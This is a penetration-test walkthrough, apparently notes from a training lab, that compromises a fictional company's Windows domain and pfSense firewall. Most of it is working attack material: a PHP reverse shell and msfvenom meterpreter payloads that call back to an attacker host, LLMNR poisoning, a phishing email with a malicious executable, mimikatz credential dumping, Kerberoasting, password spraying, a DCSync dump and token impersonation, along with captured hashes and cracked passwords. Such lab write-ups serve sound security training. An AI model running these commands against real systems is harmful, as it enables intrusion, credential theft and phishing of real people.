sub net of 10.200.74.0/24
Goal is to compromise the entire local network.

# Enumeration
## Sub net scan
```bash
nmap -sn 10.200.74.0/24
Nmap scan report for 10.200.74.138
Host is up (0.29s latency).
Nmap scan report for 10.200.74.219
Host is up (0.29s latency).
Nmap scan report for 10.200.74.232
Host is up (0.29s latency).
Nmap scan report for 10.200.74.250
Host is up (0.29s latency).
```
## 10.200.74.138
### Nmap
4 ports open:
22, 53, 80 and 443
80 redirects to 443.
Port 443 ssl cert says pfsense which is an open source firewall.
### pfsense (port 443)
First page is a sign in.
As the program is open source trying default creds of, admin:pfsense. This logs us in.
## 10.200.74.219
### Nmap
port 22, 80 (IIS, throwback hacks), 135,139,445,3389 and 5357(http)
domain name of throwback
computer name of throwback-prod
### Throwback Hacks (port 80)
Four employees; Summers Winters, Jeff Davies, Rikka Foxx, Hugh Gongo
email: hello@TBHSecurity.com

## 10.200.74.232
### Nmap
port 22, 80, 143, 993
### port 80
default creds.
tbhguest:WelcomeTBH1!
seems to be a mail server
List of names and emails.
```
"J Blaire" <BlaireJ@throwback.local>, "Nana Daiba" <DaibaN@throwback.local>, "J Davies" <DaviesJ@throwback.local>, "Rikka Foxx" <FoxxR@throwback.local>, "Hugh Gongo" <GongoH@throwback.local>, "BoJack Horseman" <HorsemanB@throwback.local>, "W Humphrey" <HumphreyW@throwback.local>, "D Jeffers" <JeffersD@throwback.local>, "Frank Murphy" <MurphyF@throwback.local>, "Mr Peanutbutter" <PeanutbutterM@throwback.local>, "Jon Peters" <PetersJ@throwback.local>, "Summers Winters" <SummersW@throwback.local>, "noreply noreply" <noreply@throwback.local>
```
Clean up the file and add the names and emails to respective lists.

# Footholds
## LLMNR
Try llmnr poisoning 
```bash
sudo responder -I tun0 -dw -v
```
This gives back a hash for PetersJ (NTLMv2) for 10.200.74.219
```hash
PetersJ::THROWBACK:f82a1e4396a9298a:1A831AE37523533530301A74B848C73C:010100000000000080649C6DFFFAD80132B71D3F0FB5132500000000020008004B004C004F00590001001E00570049004E002D005400560034004600380046004D004100310055004A0004003400570049004E002D005400560034004600380046004D004100310055004A002E004B004C004F0059002E004C004F00430041004C00030014004B004C004F0059002E004C004F00430041004C00050014004B004C004F0059002E004C004F00430041004C000700080080649C6DFFFAD80106000400020000000800300030000000000000000000000000200000D0D37C74CE75AF75DECA32C21B6A4A7CFF41DE805101929B5201D041672508550A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00370035002E00390038000000000000000000
```
Crack the hash with hashcat.
PetersJ:Throwback317
## 10.200.74.138
Under the Diagnostics section you are able to execute shell commands. As the page is .php going to guess that php code should work.
```php
php -r '$sock=fsockopen("10.50.75.98",9001);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
Setting up a nc listener
```bash
nc -lvnp 9001
```

This gives a root shell.

### Stabilise to meterpreter
The host is a linux box so going to create a linux meterpreter binary.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.50.75.98 LPORT=9002 -f elf -o ~/notashell.bin
```
Host it with a python webserver.
```bash
python3 -m http.server 80
```
Then wget and execute the file. (make   sure to have meterpreter listener within metasploit)

This wont work as the box doesnt have wget :(
doing a python pty shell kills the session :(

I'm root, /etc/shadow. nope :(
Its a firewall so log files?
```bash
find / -type f | grep log

/var/log/userlog
/var/log/system.log
/var/log/filter.log
/var/log/dhcpd.log
/var/log/vpn.log
/var/log/poes.log
/var/log/l2tps.log
/var/log/openvpn.log
/var/log/portalauth.log
/var/log/ipsec.log
/var/log/ppp.log
/var/log/relayd.log
/var/log/wireless.log
/var/log/nginx.log
/var/log/ntpd.log
/var/log/gateways.log
/var/log/resolver.log
/var/log/routing.log
/var/log/watchdogd.log
/var/log/dmesg.boot
/var/log/lastlog
/var/log/utx.lastlogin
/var/log/utx.log
/var/log/login.log
```
login.log looks interesting.
```hash
Last Login 8/9/2020 15:51 -- HumphreyW:1c13639dba96c7b53d26f7d00956a364
```
Yay.
Guessing it's an NTLM hash (cause windows AD env) and using hashcat.
```cmd
hashcat.exe hash.txt rockyou.txt -m 1000
```
```hash
1c13639dba96c7b53d26f7d00956a364:securitycenter 
```
Nothing interesting on netstat


## 10.200.74.219
ssh into the box as PetersJ (creds from llmnr)
Then elevate the shell to a meterpreter session. (this didn't work :( )
## 10.200.74.232
### Phishing email.
```txt
Good afternoon attached below is a security update for the new system.

IT Support
```
Attached is a meterpreter shell, compiled for windows.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.75.98 LPORT=9001 -f exe
```
Send the email and hope for the best.
Get a response from BlaireJ on 10.200.74.222 which is a new host.

## Persistence
### BlaireJ (10.200.74.222)
As this user is a local admin you can dump the sam file.
Spawn a powershell session, get mimikatz and dump the creds.
Blocked by antivirus :(
meterpreter can do this?
```bash
load mimikatz
lsa_dump_sam
```
this gives 3 hashes:
```
RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 0a06b1381599f2c8c8bfdbee39edbe1c
--
RID  : 000003e9 (1001)
User : BlaireJ
  Hash NTLM: c374ecb7c2ccac1df3a82bce4f80bb5b
--
RID  : 000003ea (1002)
User : sshd
  Hash NTLM: 50527b4bfe81a64edf00e6b05c26c195
```
Cracking BlaireJ's gives.
```password
7eQgx6YzxgG3vC45t5k9
```
Which lets us ssh into 10.200.74.219
#### Pivot
Using a socks proxy on 10.200.74.219 we can then pivot into 10.200.74.222

# Enumeration from 222
From here we can see the domain controller on 10.200.74.117
First running bloodhound on the host Gives a few things back.
MercerH is a domain admin
backup can do a dcsync attack
sql account is kerberoastable.
Using Humphrey's creds we can do a kerberoast.
## Kerberoast
```bash
sudo proxychains python3 GetUserSPNs.py -dc-ip 10.200.74.117 THROWBACK.local/humphreyw:securitycenter -request
```
```hash
$krb5tgs$23$*SQLService$THROWBACK.LOCAL$THROWBACK.local/SQLService*$a8a4755c0aaade8420ae1c9faea08d3b$442fff3d54bb10ab2cd1dda5a6fa020b4da8226943bd560bbf3cfafa69ea6d60a678e48955b007f5fb7e2ca81da7a38ab97bcca42a88c6a9d9cc21af0e5c979d9c31488b7b8c9f6c41e508ff74700ebc75b13c4ebbfaf3f9542ce5b9ee90c00b4e4e52a4d040e9885a99e0a7c73f8938baa567bdb0bf02cf02fbf5367cecb56d7e8a9d7fb6b8c82d69a9d348da5c1c74975545c697c5ef7dd5b051ebe82426866260325197c103197a1ffa97b71e1ac8ffe0dbd928c3101599bc2a616b4712edfb431abcbf161a382ccfb09a054203b6801f945897769e15a1a9ccfefc20aabd4e0a8e7dacd4bb8cd815ee25439a2e95282ce5bb30c10face879c11e6d9336e405d0ca3d410b9d1e94312ed28fe95eb7f8394a8199300d7429b002b168bea17cf22fab85f6c5bc4b4e3e12b91bcd967709c83ec4ace5fd1d6c21cdc482772bfd29d745cffc1d1039c155d3c68d064f24fce78d20ce55edd1818de6002f4cbc7a3120c58b60847bd441fa5ad51ac9ef708848a238053ff0abcae15d08594fee2463a941ba7482cd364076004d94fc134714a863441d22703652a33cc68989568d1c9d52edfeb45ae48a34a5006107f1788a675f00012b12185ea9a663491a83aa36c08b7298775522bda05c9ba4d1d28453c02382f9983f227bb9e6d1619529ed109895a0d1506c4ae30bf1c9467bda577895d4e8c79dc5d672ac0f2c480af4c3bb369daa2ea50edf39ded3ae1c3d167ed29b2ee2071c559257347287da1a26b6c896ec015b430ae4cf2c9e2d7b27f20e1af883d4f07a8700e15fbb52dfa25493fc6adc85f4933594e73e2da3d4bc9c14f4b11f0579ba5ce6aa76793eabb08874088a0e9ee644ac99ca3222e7b668c185bf2182be7f9419424890dd33cb7aa21ec8ffabf7ff9d16a8be969030b833cf7b6c7794ee051aa48e8bff51f6405acd7964f36a9f8a99f26a7c625aa0b4277e1a472abe4ab48bcbeca3bbd27171cae6c78722c1387722bab6b77fea8681734fdc0c598944b0241472b57312aeb4bd720d68ef7de8a39a489c35f4301c8acb52536015fac5f227258d0fe39e7aeb3fc09e8d1aa56c9f12a2b7dd6c899b1e8ce459e616a9c42575f19a9330ba0218b1f84d299bb4ce2e21902c10d052ba265362d2f4f3b5f83f3dd6261381bbd201902eb6cffe45eb3b4ebdf6ca9e3ef2caef88f1455c93094e5668987e2c0fb1835f339f2473e8f2b483eaa02935e7301e04a9c2f19c73003ac27883e07555f7865aaecc64cd005ce3f91dde0ae7d0d46c2edf6bd6c9b4fec9b81e7b41545fc008e13058ea478b51e419724c22067979a65a91b56ae698930abb1e4717ee2c0d1adc1820177dda7c4f3f1a76857d93fc74669becd9b9f9ae1134e2b9e177fd9dd11e94db2cc013777c8c206fb4f440ecae3404b43b
```
which cracks to mysql337570
This account can not login to the domain controller :(

## SMB enumeration
From the webserver we have a collection of emails in return can be valid usernames.
Try these against a simple password list
```
Summer2020
Throwback
Throwback2020
Password
```
This works with the account
```bash
proxychains crackmapexec smb 10.200.74.117 -u usernames.txt -p passwords.txt --continue-on-success
```
JeffersD:Throwback2020
Elevate the shell to be a meterpreter session.

# Enumeration on 117
In jeffers documents there is a backup\_notice.txt file. This contains creds for the backup user TBH_Backup2348!
## Pivot
use autoroute in msfconsole on 117
## Check for more hosts via nmap
10.200.74.118 is a new machine.

# Priv esc on 117
Using secretsdump with the backup account you can dump out the entire domain. :)

Within the dump is MercerH's hash
```bash
MercerH:5edc955e8167199d1b7d0e656da0ceea:pikapikachu7
```

# Foot hold on 118
I tried to use ssh and xfreerdp via proxychains but it kept timing out. So rdp chain (hehehe) Then once on the 118 box I can drop a meterpreter shell. The chain is 219 -> 117 -> 118
There is an email within the admin's documents
```txt
Hey team! Happy Thursday!

Not much on the schedule for this week, we are continuing our transition to our new 
servers please be patient with us as we make this transition.

In order to access your usual resources please go to mail.corporate.local where you will 
find our new emailing service, as well as breachgtfo.local where you will find our 
proprierty breach service that all of you are already used to.
If you have not already please add 10.200.x.232 to your hosts file in order to access these resources.

As we are auditing our infrastructure please remeber that no personal social media 
accounts should be connected to company resources such as github. If you need to use twitter to make company announcments
please use the @tbhSecurity twitter.

Please remain patient during this transition and dont be afraid to email me or any of the 
other team members with questions

Summers Winters,
CEO of Throwback Hacks Security
```

# Enumeration 118
There are 2 more boxes 243 and 79
Further enumeration shows that 79 is a domain controller, but mercerh can't login :(

# OSINT
Now that we have a few users we can check on github for potential hard coded credentials
Within RIkkaFoxx's github there are hard coded creds for DaviesJ:Management2018

Found a few more users on linkedin
Jon Stewart
Riskam Hardita

# Foothold on 243
These creds let us login to 243.

# priv esc
This user is a local admin which means we can use his token for priv esc to NT/authority system.
From within meterpreter
```bash
use incognito
impersonate_token "NT AUTHORITY\SYSTEM"
```
email in dosierk/documents
```txt
Hey team! Hope you guys are having a good day!

As all of you probably already now we are transferring to our new email service as we
transition please use the new emails provided to you as well as the default credentials
that can be found within your emails.

Please do not use these emails outside of corporate as they contain sensitive information.

The new email format is based on what department you are in:

ESM-Example@TBHSecurity.com
FIN-Example@TBHSecurity.com
HRE-Example@TBHSecurity.com
ITS-Example@TBHSecurity.com
SEC-Example@TBHSecurity.com

In order to access your email you will need to go to mail.corporate.local as we get our 
servers moved over.

If you do not already have mail.corporate.local set in your hosts file please reach out to
IT to get that fixed.

Please remain patient as we make this transition and please feel free to email me with any
questions you may have regarding the new transition: HRE-KDoiser@TBHSecurity.com

Karen Dosier,
Human Relations Consulatant
```
# Gen email list
The email format has changed to now be FLastname
Create a quick python script to generate the new emails.
```lst
JStewart
RHardita
SWinters
JDavies
RFoxx
HGongo
JBlaire
NDaiba
BHorseman
WHumphrey
DJeffers
FMurphy
MPeanutbutter
JPeters
```
Script:
```python
with open("new-emails.txt",'r') as file, open("new-email-names.txt",'w') as out:
	for i in file:
		i = i.strip()+"@TBHSecurity.com\n"
		out.write("ESM-"+i)
		out.write("FIN-"+i)
		out.write("HRE-"+i)
		out.write("ITS-"+i)
		out.write("SEC-"+i)
	out.close()
```
